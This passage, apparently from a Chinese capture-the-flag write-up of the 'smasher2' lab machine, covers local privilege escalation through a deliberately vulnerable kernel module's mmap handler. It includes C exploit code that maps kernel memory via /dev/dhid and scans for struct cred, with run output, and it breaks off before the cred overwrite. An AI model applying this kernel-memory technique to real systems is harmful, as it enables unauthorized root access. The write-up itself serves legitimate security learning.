<h4 id="提权：dzonerzy-–-gt-root"><a href="#提权：dzonerzy-–-gt-root" class="headerlink" title="提权：dzonerzy –&gt; root"></a>提权：dzonerzy –&gt; root</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cat README </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         .|<span class="string">&#x27;&#x27;</span><span class="string">&#x27;.|                            &#x27;</span>||                      </span><br><span class="line">         ||..  <span class="string">&#x27;  .. .. ..    ....    ....   || ..     ....  ... ..  </span></span><br><span class="line"><span class="string">          &#x27;</span><span class="string">&#x27;|||.   || || ||  &#x27;</span><span class="string">&#x27; .||  ||. &#x27;</span>   ||<span class="string">&#x27; ||  .|...||  ||&#x27;</span> <span class="string">&#x27;&#x27;</span> </span><br><span class="line">        .     <span class="string">&#x27;||  || || ||  .|&#x27;</span> ||  . <span class="string">&#x27;|..  ||  ||  ||       ||     </span></span><br><span class="line"><span class="string">        |&#x27;</span>....|<span class="string">&#x27;  .|| || ||. &#x27;</span>|..<span class="string">&#x27;|&#x27;</span> |<span class="string">&#x27;..|&#x27;</span> .||. ||.  <span class="string">&#x27;|...&#x27;</span> .||.    v2.0 </span><br><span class="line">                                                             </span><br><span class="line">                                                        by DZONERZY </span><br><span class="line"></span><br><span class="line">Ye you<span class="string">&#x27;ve come this far and I hope you&#x27;</span>ve learned something new, smasher wasn<span class="string">&#x27;t created</span></span><br><span class="line"><span class="string">with the intent to be a simple puzzle game... but instead I just wanted to pass my limited</span></span><br><span class="line"><span class="string">knowledge to you fellow hacker, I know it&#x27;</span>s not much but this time you<span class="string">&#x27;ll need more than</span></span><br><span class="line"><span class="string">skill, you will need to think outside the box to complete smasher 2 , have fun and happy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                       Hacking!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">free(knowledge);</span></span><br><span class="line"><span class="string">free(knowledge);</span></span><br><span class="line"><span class="string">* error for object 0xd00000000b400: pointer being freed was not allocated *</span></span><br></pre></td></tr></table></figure>

<p>给出提示说明提权需要自己写exp来通过内核内存溢出提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ find / -group adm 2&gt;/dev/null</span><br><span class="line">/var/spool/rsyslog</span><br><span class="line">/var/<span class="built_in">log</span>/apt/term.log</span><br><span class="line">/var/<span class="built_in">log</span>/syslog</span><br><span class="line">/var/<span class="built_in">log</span>/apache2</span><br><span class="line">/var/<span class="built_in">log</span>/apache2/access.log</span><br><span class="line">/var/<span class="built_in">log</span>/apache2/error.log</span><br><span class="line">/var/<span class="built_in">log</span>/apache2/other_vhosts_access.log</span><br><span class="line">/var/<span class="built_in">log</span>/kern.log</span><br><span class="line">/var/<span class="built_in">log</span>/auth.log</span><br></pre></td></tr></table></figure>

<p>通过访问auth.log，我可以查看sudo运行的不同命令。 日志行采用以下格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ strings /var/<span class="built_in">log</span>/auth.log | grep COMMAND | head -1</span><br><span class="line">Feb 15 21:58:48 smasher sudo: dzonerzy : TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get update</span><br></pre></td></tr></table></figure>
<p>使用bash-foo，可以在此日志中获得命令的列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ strings /var/<span class="built_in">log</span>/auth.log | grep COMMAND | cut -d: -f5- | sort -u</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/chown root:root banner</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/su</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/bin/systemctl <span class="built_in">enable</span> rc.local.service</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get update</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt-get upgrade</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/apt install apache2 python-pip</span><br><span class="line"> TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/id</span><br><span class="line"> TTY=unknown ; PWD=/ ; USER=dzonerzy ; COMMAND=/bin/bash -c <span class="built_in">cd</span> /home/dzonerzy/smanager &amp;&amp; ./runner.py 2&gt;&amp;1 &gt; /dev/null &amp;</span><br><span class="line"> TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/sbin/insmod /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko</span><br><span class="line"> user NOT <span class="keyword">in</span> sudoers ; TTY=tty1 ; PWD=/home/dzonerzy ; USER=root ; COMMAND=/usr/bin/id</span><br></pre></td></tr></table></figure>

<p>除了最后两个以外，其他似乎都在设置框。 倒数第二个启动以dzonerzy运行的Web服务器。 最后一个很有趣。<br>如果我在二进制文件上运行字符串，则会得到以下信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ strings /lib/modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko</span><br><span class="line">9Ogy7</span><br><span class="line">AUATSL</span><br><span class="line">D+&amp;H</span><br><span class="line">[A\A]]</span><br><span class="line">UHc=</span><br><span class="line">6DHID Device successfully closed</span><br><span class="line">6DHID Device mmap( vma_size: %x, offset: %x)</span><br><span class="line">6DHID mmap failed, requested too large a chunk of memory</span><br><span class="line">This is the right way, please exploit this shit!</span><br><span class="line">6DHID device has been opened %d time(s)</span><br><span class="line">1DHID failed to register a major number</span><br><span class="line">6DHID registered correctly with major number %d</span><br><span class="line">1DHID failed to register device class</span><br><span class="line">6DHID device class registered correctly</span><br><span class="line">1DHID failed to create the device</span><br><span class="line">6DHID device class created correctly</span><br><span class="line">6DHID mmap failed</span><br><span class="line">6DHID mmap OK</span><br><span class="line">6DHID initializing the LKM</span><br><span class="line">dhid</span><br><span class="line">6DHID unloaded</span><br><span class="line">version=1.0</span><br><span class="line">description=LKM <span class="keyword">for</span> dzonerzy dhid devices</span><br><span class="line">author=DZONERZY</span><br><span class="line">license=GPL</span><br><span class="line">srcversion=974D0512693168483CADFE9</span><br><span class="line">depends=</span><br><span class="line">retpoline=Y</span><br><span class="line">name=dhid</span><br><span class="line">vermagic=4.15.0-45-generic SMP mod_unload </span><br><span class="line">dhid</span><br><span class="line">GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0</span><br><span class="line">GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0</span><br><span class="line">dhid.c</span><br><span class="line">set_node_perm</span><br><span class="line">dev_release</span><br><span class="line">dev_mmap</span><br><span class="line">dev_read</span><br><span class="line">dev_open</span><br><span class="line">numberOpens</span><br><span class="line">dhid_init</span><br><span class="line">fops</span><br><span class="line">majorNumber</span><br><span class="line">__key.41070</span><br><span class="line">dzcharClass</span><br><span class="line">dzcharDev</span><br><span class="line">dhid_exit</span><br><span class="line">__UNIQUE_ID_version76</span><br><span class="line">__UNIQUE_ID_description75</span><br><span class="line">__UNIQUE_ID_author74</span><br><span class="line">__UNIQUE_ID_license73</span><br><span class="line">dhid.mod.c</span><br><span class="line">__UNIQUE_ID_srcversion17</span><br><span class="line">__module_depends</span><br><span class="line">__UNIQUE_ID_retpoline16</span><br><span class="line">__UNIQUE_ID_name15</span><br><span class="line">__UNIQUE_ID_vermagic14</span><br><span class="line">__class_create</span><br><span class="line">__this_module</span><br><span class="line">class_destroy</span><br><span class="line">cleanup_module</span><br><span class="line">remap_pfn_range</span><br><span class="line">kfree</span><br><span class="line">__fentry__</span><br><span class="line">init_module</span><br><span class="line">device_create</span><br><span class="line">class_unregister</span><br><span class="line">printk</span><br><span class="line">size</span><br><span class="line">_copy_to_user</span><br><span class="line">__register_chrdev</span><br><span class="line">device_destroy</span><br><span class="line">__kmalloc</span><br><span class="line">allocated</span><br><span class="line">__unregister_chrdev</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.rela.text</span><br><span class="line">.rela.init.text</span><br><span class="line">.rela.exit.text</span><br><span class="line">.rodata.str1.8</span><br><span class="line">.rodata.str1.1</span><br><span class="line">.modinfo</span><br><span class="line">.rela__mcount_loc</span><br><span class="line">.rela.data</span><br><span class="line">.rela.gnu.linkonce.this_module</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line">.note.GNU-stack</span><br></pre></td></tr></table></figure>

<p>可以在/dev中看到设备：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ ls /dev/dhid -l</span><br><span class="line">crwxrwxrwx 1 root root 243, 0 Dec 27 06:16 /dev/dhid</span><br></pre></td></tr></table></figure>

<p>F-Secure的这篇论文在分解mmap处理程序以及如何查找其中的问题方面做得非常出色。 在第4节（第15页）中，介绍了如何利用它们。 它提供了一个示例，我将在此处尝试应用该示例，并了解我能得到多大的帮助。 我的想法是，我将使用mmap处理程序浏览内存以查找凭证结构（struct cred），该结构在此处定义：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">struct cred &#123;</span><br><span class="line">    atomic_t    usage;</span><br><span class="line"><span class="comment">#ifdef CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    atomic_t    subscribers;    /* number of processes subscribed */</span><br><span class="line">    void        *put_addr;</span><br><span class="line">    unsigned    magic;</span><br><span class="line"><span class="comment">#define CRED_MAGIC    0x43736564</span></span><br><span class="line"><span class="comment">#define CRED_MAGIC_DEAD    0x44656144</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line">    kuid_t        uid;        /* real UID of the task */</span><br><span class="line">    kgid_t        gid;        /* real GID of the task */</span><br><span class="line">    kuid_t        suid;        /* saved UID of the task */</span><br><span class="line">    kgid_t        sgid;        /* saved GID of the task */</span><br><span class="line">    kuid_t        euid;        /* effective UID of the task */</span><br><span class="line">    kgid_t        egid;        /* effective GID of the task */</span><br><span class="line">    kuid_t        fsuid;        /* UID <span class="keyword">for</span> VFS ops */</span><br><span class="line">    kgid_t        fsgid;        /* GID <span class="keyword">for</span> VFS ops */</span><br><span class="line">    unsigned    securebits;    /* SUID-less security management */</span><br><span class="line">    kernel_cap_t    cap_inheritable; /* caps our children can inherit */</span><br><span class="line">    kernel_cap_t    cap_permitted;    /* caps we<span class="string">&#x27;re permitted */</span></span><br><span class="line"><span class="string">    kernel_cap_t    cap_effective;    /* caps we can actually use */</span></span><br><span class="line"><span class="string">    kernel_cap_t    cap_bset;    /* capability bounding set */</span></span><br><span class="line"><span class="string">    kernel_cap_t    cap_ambient;    /* Ambient capability set */</span></span><br><span class="line"><span class="string">#ifdef CONFIG_KEYS</span></span><br><span class="line"><span class="string">    unsigned char    jit_keyring;    /* default keyring to attach requested</span></span><br><span class="line"><span class="string">                     * keys to */</span></span><br><span class="line"><span class="string">    struct key    *session_keyring; /* keyring inherited over fork */</span></span><br><span class="line"><span class="string">    struct key    *process_keyring; /* keyring private to this process */</span></span><br><span class="line"><span class="string">    struct key    *thread_keyring; /* keyring private to this thread */</span></span><br><span class="line"><span class="string">    struct key    *request_key_auth; /* assumed request_key authority */</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string">#ifdef CONFIG_SECURITY</span></span><br><span class="line"><span class="string">    void        *security;    /* subjective LSM security */</span></span><br><span class="line"><span class="string">#endif</span></span><br><span class="line"><span class="string">    struct user_struct *user;    /* real user ID subscription */</span></span><br><span class="line"><span class="string">    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="string">    struct group_info *group_info;    /* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="string">    /* RCU deletion */</span></span><br><span class="line"><span class="string">    union &#123;</span></span><br><span class="line"><span class="string">        int non_rcu;            /* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="string">        struct rcu_head    rcu;        /* RCU deletion hook */</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125; __randomize_layout;</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，我看到了由当前用户（uid，guid，suid等）定义的8个连续的整数大小变量，然后是4个字节的securebit，然后是四个或五个（取决于内核）长整数，它们是这些功能 。<br>因此，策略将是：</p>
<p>使用mmap处理程序打开内存。<br>知道我们当前的uid是什么。<br>扫描内存以查找与当前用户的凭据结构相匹配的内容。<br>将uid/guid替换为0。<br>调用getuid（）看看我们现在是否是root。<br>如果是，则将功能替换为-1，然后以root身份生成一个新的sh进程，并中断循环。 如果不是，请将uid/guid设置回其原始值。</p>
<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>我将按照上面文章中的步骤构建脚本。 此代码可能令人生畏。 当我从这里开始并在Google上看到这篇论文时，我对此一无所知。 但是，如果您逐步执行代码，则很清楚它在做什么。</p>
<p>我要做的第一件事是尝试打开mmap设备。 我将从文章中获取代码（针对这种情况和样式，使用较小的mod）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to mmap: &quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %lx\n&quot;</span>, addr);</span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp1.c -o exp1</span><br><span class="line">exp1.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp1.c:29:33: warning: format ‘%lx’ expects argument of <span class="built_in">type</span> ‘long unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %lx\n&quot;</span>, addr);</span><br><span class="line">                               ~~^</span><br><span class="line">                               %ls</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ls</span><br><span class="line">exp1  exp1.c</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp1</span><br><span class="line">[+] PID: 1911</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br></pre></td></tr></table></figure>

<p>这样就可以打开mmap处理程序。 好的开始。 并且它按预期挂在getchar（）上。 我可以在另一个终端中通过SSH进行连接，并查看该进程的内存映射（它仍然处于活动状态并等待），并在第一行中看到dhid映射到我请求的地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cat /proc/1911/maps</span><br><span class="line">42424000-132424000 rw<span class="_">-s</span> 00000000 00:06 440                               /dev/dhid</span><br><span class="line">55c3b4c63000-55c3b4c64000 r-xp 00000000 00:19 4                          /dev/shm/exp1</span><br><span class="line">55c3b4e63000-55c3b4e64000 r--p 00000000 00:19 4                          /dev/shm/exp1</span><br><span class="line">55c3b4e64000-55c3b4e65000 rw-p 00001000 00:19 4                          /dev/shm/exp1</span><br><span class="line">55c3b6e38000-55c3b6e59000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7f3e7313d000-7f3e73324000 r-xp 00000000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e73324000-7f3e73524000 ---p 001e7000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e73524000-7f3e73528000 r--p 001e7000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e73528000-7f3e7352a000 rw-p 001eb000 08:01 263261                     /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">7f3e7352a000-7f3e7352e000 rw-p 00000000 00:00 0 </span><br><span class="line">7f3e7352e000-7f3e73555000 r-xp 00000000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">7f3e7374d000-7f3e7374f000 rw-p 00000000 00:00 0 </span><br><span class="line">7f3e73755000-7f3e73756000 r--p 00027000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">7f3e73756000-7f3e73757000 rw-p 00028000 08:01 263255                     /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class="line">7f3e73757000-7f3e73758000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffdc6c81000-7ffdc6ca2000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffdc6cf5000-7ffdc6cf8000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffdc6cf8000-7ffdc6cfa000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>

<p>使用root shell（我将很快使用它），我可以查看所有内存。 我调用了mmap，其偏移量为0，大小为0xf0000000字节。 这意味着我现在可以进入该空间。 我将在一行上打上一行，以访问上面的所有内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cat /proc/iomem</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">00000000-00000000 : System RAM</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : Video ROM</span><br><span class="line">00000000-00000000 : Adapter ROM</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">  00000000-00000000 : System ROM</span><br><span class="line">00000000-00000000 : System RAM</span><br><span class="line">  00000000-00000000 : Kernel code</span><br><span class="line">  00000000-00000000 : Kernel data</span><br><span class="line">  00000000-00000000 : Kernel bss</span><br><span class="line">00000000-00000000 : ACPI Tables</span><br><span class="line">00000000-00000000 : ACPI Non-volatile Storage</span><br><span class="line">00000000-00000000 : System RAM</span><br><span class="line">00000000-00000000 : PCI Bus 0000:00</span><br><span class="line">  00000000-00000000 : 0000:00:10.0</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:22</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:12</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:21</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:19</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:11</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:09</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:20</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:18</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:10</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:08</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:17</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:07</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:16</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:06</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:15</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:05</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:14</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:04</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:13</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:03</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:02</span><br><span class="line">  00000000-00000000 : 0000:00:0f.0</span><br><span class="line">    00000000-00000000 : vmwgfx probe</span><br><span class="line">  00000000-00000000 : PCI MMCONFIG 0000 [bus 00-7f]</span><br><span class="line">    00000000-00000000 : Reserved</span><br><span class="line">      00000000-00000000 : pnp 00:05</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:22</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:12</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0a</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:21</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:19</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:11</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:09</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:20</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:18</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:10</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:08</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:17</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0f</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:07</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:16</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0e</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:06</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:15</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0d</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:05</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:14</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0c</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:04</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:1b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:13</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:0b</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:03</span><br><span class="line">  00000000-00000000 : PCI Bus 0000:02</span><br><span class="line">    00000000-00000000 : 0000:02:01.0</span><br><span class="line">    00000000-00000000 : 0000:02:03.0</span><br><span class="line">      00000000-00000000 : ehci_hcd</span><br><span class="line">    00000000-00000000 : 0000:02:02.0</span><br><span class="line">      00000000-00000000 : ICH HD audio</span><br><span class="line">  00000000-00000000 : 0000:00:0f.0</span><br><span class="line">    00000000-00000000 : vmwgfx probe</span><br><span class="line">  00000000-00000000 : pnp 00:05</span><br><span class="line">  00000000-00000000 : 0000:00:10.0</span><br><span class="line">    00000000-00000000 : mpt</span><br><span class="line">  00000000-00000000 : 0000:00:10.0</span><br><span class="line">    00000000-00000000 : mpt</span><br><span class="line">  00000000-00000000 : 0000:00:07.7</span><br><span class="line">00000000-00000000 : Reserved</span><br><span class="line">  00000000-00000000 : IOAPIC 0</span><br><span class="line">00000000-00000000 : HPET 0</span><br><span class="line">  00000000-00000000 : pnp 00:04</span><br><span class="line">00000000-00000000 : Local APIC</span><br><span class="line">  00000000-00000000 : Reserved</span><br><span class="line">00000000-00000000 : Reserved</span><br></pre></td></tr></table></figure>

<ul>
<li>查找凭证结构</li>
</ul>
<p>现在，更新上面的代码以通过获取当前uid来在内存中查找凭证对象，然后添加一个循环以连续八次查找该int：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to mmap: &quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">    unsigned int uid = getuid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] UID: %d\n&quot;</span>, uid);</span><br><span class="line"></span><br><span class="line">    unsigned int credIt = 0;</span><br><span class="line">    unsigned int credNum = 0;</span><br><span class="line">    <span class="keyword">while</span> (((unsigned long)addr) &lt; (mmapStart + size -0x40))</span><br><span class="line">    &#123;</span><br><span class="line">        credIt = 0;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid</span><br><span class="line">            )</span><br><span class="line">        &#123;</span><br><span class="line">            credNum++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found cred structure! ptr: %p, credNum: %d\n&quot;</span>, addr, credNum);</span><br><span class="line">        &#125;</span><br><span class="line">        addr++;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;[+] Scanning loop END&quot;</span>);</span><br><span class="line">    fflush(stdout);</span><br><span class="line"></span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我编译并运行时，它会发现19种潜在的cred structs:</p>
